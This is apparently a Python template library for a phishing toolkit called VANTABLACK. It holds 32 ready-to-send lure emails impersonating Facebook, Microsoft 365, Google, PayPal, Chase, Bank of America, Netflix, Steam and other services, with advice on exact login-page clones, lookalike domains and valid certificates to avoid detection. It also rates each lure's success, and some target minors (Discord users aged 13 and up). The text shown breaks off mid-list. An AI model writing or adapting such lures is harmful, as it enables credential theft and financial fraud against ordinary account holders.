#!/usr/bin/env python3
"""
VANTABLACK Campaign Templates Library
=====================================
Complete collection of pre-built phishing scenarios for rapid deployment.

Each template includes:
- Phishlet configuration
- Complete email template
- Landing page specifications
- Recommended stealth level
- Success rate estimation
- Target audience analysis

Usage:
    python3 campaign_templates.py --list              # List all templates
    python3 campaign_templates.py --show <id>        # Show template details
    python3 campaign_templates.py --generate <id>    # Generate campaign files
    python3 campaign_templates.py --search <term>    # Search templates

Total Templates: 30+
"""

from dataclasses import dataclass, field
from typing import List, Optional, Dict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
import sys

console = Console()


@dataclass
class CampaignTemplate:
    """Represents a complete campaign template."""
    id: int
    name: str
    category: str              # social, banking, productivity, gaming, shopping, work
    description: str
    target: str                # Primary target audience
    phishlet: str              # Which phishlet to use
    stealth_level: int         # 1-5
    difficulty: str            # beginner, intermediate, advanced
    success_rate: str          # Low, Medium, High
    estimated_time: str        # Setup time
    email_template: str        # Full email body
    landing_suggestions: List[str] = field(default_factory=list)
    best_practices: List[str] = field(default_factory=list)
    alternatives: List[str] = field(default_factory=list)


# ============================================================
# COMPLETE CAMPAIGN TEMPLATES LIBRARY (30+ Templates)
# ============================================================

CAMPAIGN_TEMPLATES = [
    # ==================== SOCIAL MEDIA ====================
    
    CampaignTemplate(
        id=1,
        name="Facebook Account Verification",
        category="social",
        description="Facebook security check simulation - account compromised alert",
        target="General Users, Age 25-55",
        phishlet="facebook",
        stealth_level=3,
        difficulty="beginner",
        success_rate="High",
        estimated_time="10min",
        email_template="""Subject: 🔒 Facebook: Your account may be compromised

Dear {first_name},

We detected unusual activity on your Facebook account.

⚠️ We've temporarily limited some features until you verify your identity.

What we found:
• Login from new device (Unknown Location)
• Multiple failed password attempts
• Suspicious friend requests sent

[Secure Your Account Now]

If you don't verify within 24 hours, your account may be permanently disabled.

Facebook Security Team
This is an automated message. Do not reply.""",
        landing_suggestions=[
            "Clone Facebook's exact login page (2024 version)",
            "Use authentic Facebook favicon and branding",
            "Include 'Having trouble logging in?' link",
            "Match Facebook's error message styling exactly"
        ],
        best_practices=[
            "Use HTTPS with valid SSL certificate",
            "Match URL bar to look like facebook.com",
            "Include real Facebook footer links"
        ],
        alternatives=["Instagram password reset", "Facebook Two-Factor"]
    ),
    
    CampaignTemplate(
        id=2,
        name="Instagram Password Reset",
        category="social",
        description="Instagram password reset request - account security alert",
        target="Influencers, Content Creators, Age 18-35",
        phishlet="instagram",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 🔐 Instagram: Reset your password

Hi {first_name},

We received a request to reset your Instagram password.

If this was you, you can reset your password using the link below:

[Reset Your Password]

If you didn't request this, you can ignore this email. Your account is safe.

This link will expire in 24 hours.

Instagram Team
Meta © 2024""",
        landing_suggestions=[
            "Copy Instagram's exact reset password page",
            "Use Instagram logo from official source",
            "Include 'Having trouble?' link to alternate verification",
            "Match Instagram's color scheme (#E4405F)"
        ],
        best_practices=[
            "Use a domain that looks like instagram.com",
            "Copy exact CSS styling from real page",
            "Include Instagram's privacy policy link"
        ],
        alternatives=["Facebook login", "WhatsApp verification"]
    ),
    
    CampaignTemplate(
        id=3,
        name="LinkedIn Connection Request",
        category="social",
        description="LinkedIn profile view notification - recruiter engagement",
        target="Professionals, Job Seekers, Business Users",
        phishlet="linkedin",
        stealth_level=3,
        difficulty="beginner",
        success_rate="High",
        estimated_time="10min",
        email_template="""Subject: 👤 {first_name}, you appeared in 8 searches this week

Hi {first_name},

Your LinkedIn profile is getting noticed!

📊 Profile Analytics:
• 8 recruiters viewed your profile
• 3 new connection requests
• 5 new jobs match your experience

View who's looking at your profile:

[View Profile Stats]

Your profile stands out to these recruiters:
• HR Manager at TechCorp
• Talent Acquisition at StartupXYZ
• Recruiting Lead at Enterprise Inc.

Best,
LinkedIn Team""",
        landing_suggestions=[
            "Mirror LinkedIn's exact design language",
            "Include fake connection request avatars",
            "Add 'See who's viewed your profile' CTA",
            "Match LinkedIn's blue color (#0A66C2)"
        ],
        best_practices=[
            "Use professional-looking domain",
            "Include LinkedIn's footer",
            "Match LinkedIn's typography"
        ],
        alternatives=["LinkedIn login", "LinkedIn InMail"]
    ),
    
    CampaignTemplate(
        id=4,
        name="Twitter/X Account Lock",
        category="social",
        description="X (Twitter) account security alert - unusual activity",
        target="Journalists, Politicians, Influencers, Tech Users",
        phishlet="twitter",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: ⚠️ X: Your account may be compromised

Hi {first_name},

We detected unusual activity on your X account.

🚨 Security Alert:
• New login from unrecognized device
• Attempted tweet deletion detected
• Privacy settings modified

Your account has been temporarily locked for your protection.

[Secure Your Account]

If this wasn't you, please change your password immediately.

X Safety Team""",
        landing_suggestions=[
            "Clone X's current login page design",
            "Use X logo (not Twitter)",
            "Include 'Forgot password?' link",
            "Match X's dark/light mode styling"
        ],
        best_practices=[
            "Use domain similar to x.com",
            "Copy exact form styling",
            "Include fake error messages"
        ],
        alternatives=["X verification", "X two-factor"]
    ),
    
    CampaignTemplate(
        id=5,
        name="Discord Nitro Gift",
        category="social",
        description="Discord Nitro gift claim - free premium offer",
        target="Gamers, Discord Users, Age 13-30",
        phishlet="discord",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 🎁 {first_name}, you received a Discord Nitro gift!

Hey {first_name}!

A friend sent you Discord Nitro as a gift! 

🎁 Your Gift:
• Discord Nitro (3 Months)
• Value: $29.99

[Claim Your Gift Now]

This gift will expire in 24 hours!

Don't miss out on:
✓ HD video sharing
✓ Custom emojis everywhere
✓ Longer messages
✓ Server boosts

Claim it before it's gone!

Discord Team""",
        landing_suggestions=[
            "Create Discord gift claim landing page",
            "Use Discord's actual Nitro page layout",
            "Include Discord logo and branding",
            "Add urgency with countdown timer"
        ],
        best_practices=[
            "Use HTTPS with valid certificate",
            "Copy Discord's exact button styling",
            "Include fake Nitro features list"
        ],
        alternatives=["Discord login", "Steam gift"]
    ),

    # ==================== PRODUCTIVITY & WORK ====================
    
    CampaignTemplate(
        id=6,
        name="Microsoft 365 Password Expiry",
        category="work",
        description="Microsoft 365 password expiration warning - corporate users",
        target="Corporate Employees, IT Staff, Executives",
        phishlet="o365",
        stealth_level=2,
        difficulty="beginner",
        success_rate="Very High",
        estimated_time="10min",
        email_template="""Subject: ⚠️ Action Required: Your Microsoft 365 password expires in 24 hours

Dear {first_name},

Your Microsoft 365 password will expire in 24 hours.

📋 Account Details:
• Email: {email}
• Current password expires: {expiry_date}

To avoid interruption to your work, please update your password now.

[Update Password]

If you don't update your password, your account will be locked and you will lose access to:
• Outlook email
• OneDrive files
• Teams chat and meetings
• SharePoint documents

Microsoft Support Team
This is an automated message from your IT Department""",
        landing_suggestions=[
            "Use company's actual Microsoft login page",
            "Include company logo in header",
            "Match Microsoft's exact login styling",
            "Use company's domain for sending"
        ],
        best_practices=[
            "Send from company email domain",
            "Match company's internal email format",
            "Include IT helpdesk contact"
        ],
        alternatives=["Office 365 login", "Azure AD login"]
    ),
    
    CampaignTemplate(
        id=7,
        name="Google Workspace Security Alert",
        category="work",
        description="Google account unusual login - security warning",
        target="G-Suite Users, Business Professionals, Students",
        phishlet="google",
        stealth_level=2,
        difficulty="beginner",
        success_rate="Very High",
        estimated_time="10min",
        email_template="""Subject: 🔒 Google: Unusual login detected

Hi {first_name},

We detected an unusual sign-in to your Google Account.

📍 Security Alert:
• Location: {location}
• IP Address: {ip}
• Device: {device}
• Time: {timestamp}

If this wasn't you, someone may have access to your account.

[Secure Your Account]

What you can do:
1. Change your password immediately
2. Enable 2-Step Verification
3. Review recent account activity

Google Security Team
This is an automated message from Google""",
        landing_suggestions=[
            "Match Google's actual login page exactly",
            "Include real Google favicon",
            "Use HTTPS with valid certificate",
            "Copy Google's exact error message styling"
        ],
        best_practices=[
            "Use google.com or similar domain",
            "Copy exact CSS from real page",
            "Include Google footer links"
        ],
        alternatives=["Gmail login", "Google Account recovery"]
    ),
    
    CampaignTemplate(
        id=8,
        name="Slack Workspace Invitation",
        category="work",
        description="Slack workspace invite - team collaboration",
        target="Remote Workers, Startup Employees, Teams",
        phishlet="slack",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 📎 You've been invited to join "{workspace_name}" on Slack

Hey {first_name},

You've been invited to join the {workspace_name} team on Slack!

👋 Join your team on Slack:

[Join {workspace_name}]

What is Slack?
Slack is where work happens. It's a messaging app for business that connects people to the information they need.

With Slack you can:
• Chat with your team in channels
• Share files and documents
• Integrate with your favorite tools
• Search through conversations

Join now to start collaborating!

Slack Team""",
        landing_suggestions=[
            "Clone Slack's actual invite page",
            "Use Slack logo and branding",
            "Include Slack's workspace preview",
            "Match Slack's color scheme (#4A154B)"
        ],
        best_practices=[
            "Copy exact Slack form styling",
            "Include fake team member avatars",
            "Add Slack's footer links"
        ],
        alternatives=["Slack login", "Microsoft Teams invite"]
    ),
    
    CampaignTemplate(
        id=9,
        name="Zoom Meeting Invitation",
        category="work",
        description="Zoom meeting invite - calendar appointment",
        target="Business Professionals, Remote Workers, Students",
        phishlet="zoom",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 📹 Zoom Meeting Invitation: {meeting_name}

Hi {first_name},

You're invited to a Zoom meeting.

📋 Meeting Details:
• Topic: {meeting_name}
• Time: {meeting_time}
• Duration: {duration}

[Join Zoom Meeting]

Or copy this link:
{meeting_link}

Join by phone:
{phone_number}

Zoom Support""",
        landing_suggestions=[
            "Create Zoom join meeting page",
            "Use Zoom logo and branding",
            "Include fake meeting controls",
            "Match Zoom's color scheme (#2D8CFF)"
        ],
        best_practices=[
            "Copy exact Zoom styling",
            "Include fake participant list",
            "Add Zoom footer"
        ],
        alternatives=["Zoom login", "Google Meet invite"]
    ),
    
    CampaignTemplate(
        id=10,
        name="Salesforce Account Alert",
        category="work",
        description="Salesforce security notification - account review",
        target="Sales Reps, CRM Users, Business Executives",
        phishlet="salesforce",
        stealth_level=4,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="20min",
        email_template="""Subject: ⚠️ Salesforce: Action Required - Account Review

Dear {first_name},

Your Salesforce account requires immediate attention.

📋 Review Required:
• Unusual login detected
• New device authorized
• Data export attempted

[Review Your Account]

Please verify your identity and review recent activity.

If you did not perform these actions, please change your password immediately.

Salesforce Trust & Security Team""",
        landing_suggestions=[
            "Clone Salesforce Lightning experience",
            "Use Salesforce logo",
            "Include Salesforce navigation",
            "Match Salesforce styling (#00A1E0)"
        ],
        best_practices=[
            "Copy exact Salesforce CSS",
            "Include Salesforce alerts styling",
            "Add Salesforce footer"
        ],
        alternatives=["Salesforce login", "Salesforce two-factor"]
    ),
    
    CampaignTemplate(
        id=11,
        name="GitHub Security Alert",
        category="work",
        description="GitHub security notification - unauthorized access",
        target="Developers, DevOps, Security Researchers",
        phishlet="github",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: ⚠️ GitHub: New device login detected

Hey {first_name},

A new device accessed your GitHub account.

🔐 Security Alert:
• Device: {device}
• Location: {location}
• IP: {ip}
• Time: {timestamp}

If this was you, you can ignore this email.

[Verify Device]

If you don't recognize this login, please secure your account immediately by changing your password.

GitHub Security Team""",
        landing_suggestions=[
            "Clone GitHub's login page",
            "Use GitHub Octocat logo",
            "Include GitHub's two-factor prompt",
            "Match GitHub's dark/light themes"
        ],
        best_practices=[
            "Copy exact GitHub styling",
            "Include GitHub security settings",
            "Add GitHub footer"
        ],
        alternatives=["GitLab login", "Bitbucket login"]
    ),

    # ==================== BANKING & FINANCE ====================
    
    CampaignTemplate(
        id=12,
        name="PayPal Account Limitation",
        category="banking",
        description="PayPal account limitation - security hold",
        target="Online Shoppers, E-commerce Users",
        phishlet="paypal",
        stealth_level=3,
        difficulty="beginner",
        success_rate="Very High",
        estimated_time="10min",
        email_template="""Subject: ⚠️ PayPal: Your account has been limited

Dear {first_name},

We've limited your PayPal account until you verify your information.

🔒 What's Limited:
• Sending money
• Withdrawing funds
• Online purchases
• Account balance access

[Verify Your Account]

Please update your information within 48 hours to avoid permanent account restriction.

What you need to do:
1. Confirm your identity
2. Update your payment methods
3. Verify your address

PayPal Security Team
This is an automated message from PayPal""",
        landing_suggestions=[
            "Clone PayPal's exact login page",
            "Use PayPal logo and branding",
            "Include PayPal security badges",
            "Match PayPal's styling (#003087)"
        ],
        best_practices=[
            "Copy exact PayPal form",
            "Include PayPal trust signals",
            "Add PayPal footer links"
        ],
        alternatives=["PayPal payment", "PayPal checkout"]
    ),
    
    CampaignTemplate(
        id=13,
        name="Chase Bank Alert",
        category="banking",
        description="Chase bank suspicious activity - account security",
        target="Chase Bank Customers",
        phishlet="chase",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="25min",
        email_template="""Subject: 🔒 Chase: Suspicious Activity Detected on Your Account

Dear {first_name},

We detected suspicious activity on your Chase account.

⚠️ Alert Details:
• Unusual transaction attempted
• New device login detected
• Location: {location}

[Review Activity Now]

If you don't recognize this activity, please:
1. Change your password immediately
2. Contact us at 1-800-935-9935
3. Review recent transactions

Chase Fraud Prevention
This is an automated message""",
        landing_suggestions=[
            "Create Chase login page",
            "Use Chase logo",
            "Include fake security checklist",
            "Match Chase blue (#117ACA)"
        ],
        best_practices=[
            "Copy exact Chase styling",
            "Include fake account summary",
            "Add Chase footer"
        ],
        alternatives=["Bank of America", "Wells Fargo"]
    ),
    
    CampaignTemplate(
        id=14,
        name="Bank of America Security",
        category="banking",
        description="Bank of America account verification required",
        target="Bank of America Customers",
        phishlet="bankofamerica",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="25min",
        email_template="""Subject: 🔐 Bank of America: Action Required - Account Verification

Dear {first_name},

We need to verify your account information.

⚠️ Your account has been temporarily limited.

[Verify Your Identity Now]

Please complete the verification process to restore full access to your account.

Why is this happening?
• We couldn't verify your information
• Suspicious activity detected
• Routine security maintenance

Bank of America
Online Banking Support""",
        landing_suggestions=[
            "Clone Bank of America login",
            "Use BofA logo",
            "Include fake security questions",
            "Match BofA styling (#012169)"
        ],
        best_practices=[
            "Copy exact BofA CSS",
            "Include fake account info",
            "Add BofA footer"
        ],
        alternatives=["Wells Fargo", "Citi"]
    ),

    # ==================== SHOPPING & E-COMMERCE ====================
    
    CampaignTemplate(
        id=15,
        name="Amazon Order Confirmation",
        category="shopping",
        description="Amazon order receipt - purchase confirmation",
        target="Amazon Shoppers, Online Buyers",
        phishlet="amazon",
        stealth_level=3,
        difficulty="beginner",
        success_rate="High",
        estimated_time="10min",
        email_template="""Subject: 📦 Your Amazon.com order has shipped! Order #{order_number}

Dear Customer,

Great news! Your order has shipped!

📋 Order Details:
• Order #: {order_number}
• Estimated delivery: {delivery_date}
• Items: {item_count} item(s)

[Track Your Package]

📦 Shipment Details:
{item_list}

Subtotal: ${subtotal}
Shipping: ${shipping}
Tax: ${tax}
Total: ${total}

If you didn't order this, click below:
[Cancel Order]

Thank you for shopping with us!

Amazon.com
© 2024 Amazon.com, Inc.""",
        landing_suggestions=[
            "Clone Amazon's order confirmation page",
            "Use Amazon logo and branding",
            "Include fake order details",
            "Match Amazon's styling (#FF9900)"
        ],
        best_practices=[
            "Copy exact Amazon receipt format",
            "Include fake product images",
            "Add Amazon footer"
        ],
        alternatives=["Amazon login", "Amazon password reset"]
    ),
    
    CampaignTemplate(
        id=16,
        name="Amazon Account Locked",
        category="shopping",
        description="Amazon account verification required - security",
        target="Amazon Customers, Prime Members",
        phishlet="amazon",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: ⚠️ Amazon: Verify your account

Dear {first_name},

We've locked your Amazon account for your protection.

🔒 Account Locked:
• Unusual sign-in activity
• Payment method verification needed

[Verify Your Account]

Please verify your identity to restore access to:
• Your Amazon account
• Prime benefits
• Order history
• Saved payment methods

Amazon.com
Account Support Team""",
        landing_suggestions=[
            "Clone Amazon's account verification page",
            "Use Amazon logo",
            "Include fake security steps",
            "Match Amazon styling"
        ],
        best_practices=[
            "Copy exact Amazon form",
            "Include Amazon trust badges",
            "Add Amazon help links"
        ],
        alternatives=["Amazon order", "Amazon payment"]
    ),
    
    CampaignTemplate(
        id=17,
        name="eBay Purchase Confirmation",
        category="shopping",
        description="eBay order notification - payment received",
        target="eBay Buyers and Sellers",
        phishlet="ebay",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 📦 eBay: Your payment of ${amount} was received

Hi {first_name},

Great news! You received a payment on eBay.

💰 Payment Details:
• Amount: ${amount}
• Item: {item_name}
• Buyer: {buyer_name}
• Transaction ID: {transaction_id}

[View Transaction]

The buyer has paid and you can now ship the item.

eBay Seller Center""",
        landing_suggestions=[
            "Clone eBay's payment page",
            "Use eBay logo",
            "Include fake transaction details",
            "Match eBay styling (#E53238)"
        ],
        best_practices=[
            "Copy exact eBay styling",
            "Include eBay navigation",
            "Add eBay footer"
        ],
        alternatives=["eBay login", "PayPal invoice"]
    ),
    
    CampaignTemplate(
        id=18,
        name="Walmart Order Issue",
        category="shopping",
        description="Walmart order problem - action required",
        target="Walmart Online Shoppers",
        phishlet="walmart",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: ⚠️ Walmart: Action required for your order #{order_number}

Dear {first_name},

We need additional information for your order.

📦 Order #{order_number}:
• Item: {item_name}
• Issue: Payment verification needed

[Complete Your Order]

Please verify your payment method to process your order.

If you didn't place this order, please:
1. Cancel the order
2. Change your password
3. Contact us immediately

Walmart Customer Service""",
        landing_suggestions=[
            "Clone Walmart's order page",
            "Use Walmart logo",
            "Include fake order details",
            "Match Walmart styling (#0071CE)"
        ],
        best_practices=[
            "Copy exact Walmart CSS",
            "Include Walmart help links",
            "Add Walmart footer"
        ],
        alternatives=["Target order", "BestBuy order"]
    ),
    
    CampaignTemplate(
        id=19,
        name="BestBuy Order Confirmation",
        category="shopping",
        description="BestBuy purchase receipt - order shipped",
        target="BestBuy Customers, Tech Buyers",
        phishlet="bestbuy",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 📦 Your BestBuy.com order has shipped!

Dear {first_name},

Thank you for your order!

📋 Order #{order_number}:
• Item: {item_name}
• Price: ${price}
• Shipping: ${shipping}
• Total: ${total}

Estimated Delivery: {delivery_date}

[Track Your Order]

Best Buy
Questions? Call 1-888-BEST-BUY""",
        landing_suggestions=[
            "Clone BestBuy order page",
            "Use BestBuy logo",
            "Include fake product info",
            "Match BestBuy styling (#0046BE)"
        ],
        best_practices=[
            "Copy exact BestBuy styling",
            "Include BestBuy guarantees",
            "Add BestBuy footer"
        ],
        alternatives=["Newegg order", "Amazon order"]
    ),

    # ==================== STREAMING & ENTERTAINMENT ====================
    
    CampaignTemplate(
        id=20,
        name="Netflix Account Update",
        category="streaming",
        description="Netflix payment update - billing issue",
        target="Netflix Subscribers, Streaming Users",
        phishlet="netflix",
        stealth_level=3,
        difficulty="beginner",
        success_rate="Very High",
        estimated_time="10min",
        email_template="""Subject: 🔴 Netflix: Please update your payment method

Hi {first_name},

We couldn't process your latest payment.

💳 Payment Issue:
• Your Netflix membership has been paused
• We couldn't charge your card

[Update Payment Method]

Please update your payment information to continue enjoying Netflix.

Current membership: {plan}
Monthly price: ${price}

If you already updated your payment, please disregard this email.

Netflix Team""",
        landing_suggestions=[
            "Clone Netflix's payment page",
            "Use Netflix logo and branding",
            "Include fake account info",
            "Match Netflix's red/black styling (#E50914)"
        ],
        best_practices=[
            "Copy exact Netflix form",
            "Include Netflix shows preview",
            "Add Netflix footer"
        ],
        alternatives=["Netflix login", "Netflix reset password"]
    ),
    
    CampaignTemplate(
        id=21,
        name="Spotify Premium Gift",
        category="streaming",
        description="Spotify gift card - free premium offer",
        target="Music Lovers, Spotify Users, Gift Recipients",
        phishlet="spotify",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 🎁 {first_name}, you received a Spotify Premium gift!

Hey {first_name}!

A friend sent you Spotify Premium as a gift! 

🎵 Your Gift:
• Spotify Premium (3 Months Free)
• Value: $29.97

[Claim Your Gift]

With Spotify Premium you get:
✓ Ad-free music listening
✓ Download music for offline
✓ High quality audio
✓ Unlimited skips

Claim your gift now!

Spotify Team""",
        landing_suggestions=[
            "Create Spotify gift claim page",
            "Use Spotify logo and branding",
            "Include Spotify green (#1DB954)",
            "Add fake premium features"
        ],
        best_practices=[
            "Copy exact Spotify styling",
            "Include Spotify playlists preview",
            "Add Spotify footer"
        ],
        alternatives=["Spotify login", "Apple Music"]
    ),
    
    CampaignTemplate(
        id=22,
        name="Hulu Account Problem",
        category="streaming",
        description="Hulu payment failure - account suspended",
        target="Hulu Subscribers, Streaming Users",
        phishlet="hulu",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: ⚠️ Hulu: Action needed on your account

Hi {first_name},

We couldn't process your payment.

📺 Your Hulu has been paused:
• Payment method declined
• Update needed to continue watching

[Update Payment]

Current Plan: {plan}
Monthly: ${price}

Update your payment to resume streaming!

Hulu Support""",
        landing_suggestions=[
            "Clone Hulu's payment page",
            "Use Hulu logo",
            "Include fake show previews",
            "Match Hulu styling (#1CE783)"
        ],
        best_practices=[
            "Copy exact Hulu CSS",
            "Include Hulu content",
            "Add Hulu footer"
        ],
        alternatives=["Disney+", "Netflix"]
    ),
    
    CampaignTemplate(
        id=23,
        name="Disney+ Bundle Offer",
        category="streaming",
        description="Disney+ bundle promotion - special offer",
        target="Disney Fans, Streaming Bundles, Families",
        phishlet="disney",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 🎬 {first_name}, special offer just for you!

Hey {first_name}!

Get Disney+, Hulu, and ESPN+ together!

💫 Bundle Deal:
• Disney+ ($7.99/mo)
• Hulu ($7.99/mo)  
• ESPN+ ($6.99/mo)
• Total: $22.97/mo
• Your price: $14.99/mo!

[Get The Bundle]

Offer ends soon!

Disney+ Team""",
        landing_suggestions=[
            "Create Disney+ bundle page",
            "Use Disney+ logo",
            "Include Disney/Marvel/Pixar images",
            "Match Disney+ styling (#113CCF)"
        ],
        best_practices=[
            "Copy exact Disney+ styling",
            "Include Disney properties",
            "Add Disney footer"
        ],
        alternatives=["Netflix", "Hulu"]
    ),

    # ==================== GAMING ====================
    
    CampaignTemplate(
        id=24,
        name="Steam Gift Card",
        category="gaming",
        description="Steam gift card - free wallet credit",
        target="Gamers, Steam Users",
        phishlet="steam",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 🎮 {first_name}, you received a Steam gift card!

Hey {first_name}!

A friend sent you a Steam Gift Card!

💰 Gift Card Value: ${amount}

[Redeem Your Gift Card]

Use your gift card to:
• Buy new games
• In-game purchases
• Software
• Hardware

Redeem now!

Steam""",
        landing_suggestions=[
            "Create Steam gift card page",
            "Use Steam logo and branding",
            "Include fake Steam wallet balance",
            "Match Steam styling (#171A21)"
        ],
        best_practices=[
            "Copy exact Steam styling",
            "Include Steam store preview",
            "Add Steam footer"
        ],
        alternatives=["Steam login", "Epic Games"]
    ),
    
    CampaignTemplate(
        id=25,
        name="PlayStation Account",
        category="gaming",
        description="PlayStation Network - account verification",
        target="PlayStation Gamers, PS4/PS5 Users",
        phishlet="playstation",
        stealth_level=4,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="20min",
        email_template=""""Subject: 🎮 PSN: Verify your account

Dear {first_name},

Your PlayStation Network account needs verification.

⚠️ Action Required:
• New device sign-in detected
• Identity verification needed

[Verify Account]

Please confirm your identity to continue using PSN.

PlayStation Network""",
        landing_suggestions=[
            "Clone PlayStation login",
            "Use PSN logo",
            "Include fake PSN features",
            "Match PSN styling (#003087)"
        ],
        best_practices=[
            "Copy exact PSN CSS",
            "Include PS Plus benefits",
            "Add PlayStation footer"
        ],
        alternatives=["Xbox", "Nintendo"]
    ),
    
    CampaignTemplate(
        id=26,
        name="Xbox Live Account",
        category="gaming",
        description="Microsoft/Xbox account security alert",
        target="Xbox Gamers, Game Pass Users",
        phishlet="xbox",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 🎯 Xbox: Security alert for your account

Hi {first_name},

We detected unusual activity on your Xbox account.

🔐 Security Alert:
• New console sign-in
• Location: {location}

[Secure Your Account]

If this wasn't you, change your password immediately.

Xbox Support""",
        landing_suggestions=[
            "Clone Xbox login page",
            "Use Xbox logo",
            "Include Xbox Game Pass info",
            "Match Xbox styling (#107C10)"
        ],
        best_practices=[
            "Copy exact Xbox styling",
            "Include Xbox features",
            "Add Xbox footer"
        ],
        alternatives=["PlayStation", "Steam"]
    ),

    # ==================== CLOUD STORAGE ====================
    
    CampaignTemplate(
        id=27,
        name="Dropbox File Shared",
        category="cloud",
        description="Dropbox file share notification",
        target="Business Users, Professionals, Students",
        phishlet="dropbox",
        stealth_level=3,
        difficulty="beginner",
        success_rate="High",
        estimated_time="10min",
        email_template="""Subject: 📁 {sender_name} shared "{filename}" with you

Hi {first_name},

{sender_name} shared a file with you via Dropbox.

📄 File Details:
• File: {filename}
• Size: {file_size}
• Shared: {share_date}

[View File]

Dropbox - Store and share your files""",
        landing_suggestions=[
            "Clone Dropbox's shared file page",
            "Use Dropbox logo and branding",
            "Include fake file preview",
            "Match Dropbox styling (#0061FF)"
        ],
        best_practices=[
            "Copy exact Dropbox styling",
            "Include Dropbox features",
            "Add Dropbox footer"
        ],
        alternatives=["Google Drive", "OneDrive"]
    ),
    
    CampaignTemplate(
        id=28,
        name="OneDrive Access Request",
        category="cloud",
        description="OneDrive file or folder shared",
        target="Microsoft 365 Users, Business Users",
        phishlet="onedrive",
        stealth_level=3,
        difficulty="intermediate",
        success_rate="High",
        estimated_time="15min",
        email_template="""Subject: 📧 {sender_name} wants to share "{filename}" with you

Hi {first_name},

{sender_name} is inviting you to view a file in OneDrive.

📄 File: {filename}
📁 Folder: {folder_name}

[Open in OneDrive]

Microsoft OneDrive""",
        landing_suggestions=[
            "Clone OneDrive share page",
            "Use Microsoft logo",
            "Include fake file preview",
            "Match OneDrive styling (#094AB2)"
        ],
        best_practices=[
            "Copy exact OneDrive styling",
            "Include Office integration",
            "Add Microsoft footer"
        ],
        alternatives=["Dropbox", "Google Drive"]
    ),
    
    CampaignTemplate(
        id=29,
        name="iCloud Account",
        category="cloud",
        description="Apple iCloud - account verification",
        target="Apple Users, iPhone Users",
        phishlet="icloud",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="20min",
        email_template="""Subject: 🍎 Apple ID: Verify your identity

Dear {first_name},

Your Apple ID was used to sign in to iCloud on a new device.

🔐 Security Notice:
• Device: {device}
• Location: {location}
• Date: {date}

[Verify Your Identity]

If you didn't sign in, change your password immediately.

Apple Support""",
        landing_suggestions=[
            "Clone Apple ID login",
            "Use Apple logo",
            "Include fake Apple services",
            "Match Apple styling"
        ],
        best_practices=[
            "Copy exact Apple CSS",
            "Include Apple Music/iCloud info",
            "Add Apple footer"
        ],
        alternatives=["iCloud storage", "Apple ID"]
    ),
    
    CampaignTemplate(
        id=30,
        name="Google Drive Share",
        category="cloud",
        description="Google Drive file shared with you",
        target="Gmail Users, Google Workspace Users",
        phishlet="google",
        stealth_level=3,
        difficulty="beginner",
        success_rate="High",
        estimated_time="10min",
        email_template="""Subject: 📎 {sender_name} shared "{filename}" with you

Hi {first_name},

{sender_name} shared a file with you.

📄 {filename}
📁 Shared via Google Drive

[View File]

Google Drive - Storage and collaboration""",
        landing_suggestions=[
            "Clone Google Drive share page",
            "Use Google Drive logo",
            "Include fake file preview",
            "Match Google styling"
        ],
        best_practices=[
            "Copy exact Google styling",
            "Include Google Drive features",
            "Add Google footer"
        ],
        alternatives=["Dropbox", "OneDrive"]
    ),

    # ==================== EMAIL SERVICES ====================
    
    CampaignTemplate(
        id=31,
        name="Gmail Account Recovery",
        category="email",
        description="Gmail password recovery - account access",
        target="Gmail Users, Google Account Holders",
        phishlet="google",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 🔐 Google: Recover your account

Hi {first_name},

We're helping you recover your Google Account.

📧 Account: {email}

[Recover Account]

If you didn't request this, ignore this email.

Google Account Team""",
        landing_suggestions=[
            "Clone Google account recovery",
            "Use Google logo",
            "Include fake recovery steps",
            "Match Google styling"
        ],
        best_practices=[
            "Copy exact Google recovery form",
            "Include security tips",
            "Add Google footer"
        ],
        alternatives=["Gmail login", "Google password"]
    ),
    
    CampaignTemplate(
        id=32,
        name="Yahoo Account Security",
        category="email",
        description="Yahoo account security alert",
        target="Yahoo Mail Users",
        phishlet="yahoo",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: ⚠️ Yahoo: Your account requires attention

Dear {first_name},

We noticed unusual activity on your Yahoo account.

🔒 Security Alert:
• New sign-in detected
• Verification needed

[Verify Your Account]

Yahoo Mail Support""",
        landing_suggestions=[
            "Clone Yahoo login",
            "Use Yahoo logo",
            "Include fake account info",
            "Match Yahoo styling (#410093)"
        ],
        best_practices=[
            "Copy exact Yahoo CSS",
            "Include Yahoo features",
            "Add Yahoo footer"
        ],
        alternatives=["Gmail", "Outlook"]
    ),
    
    CampaignTemplate(
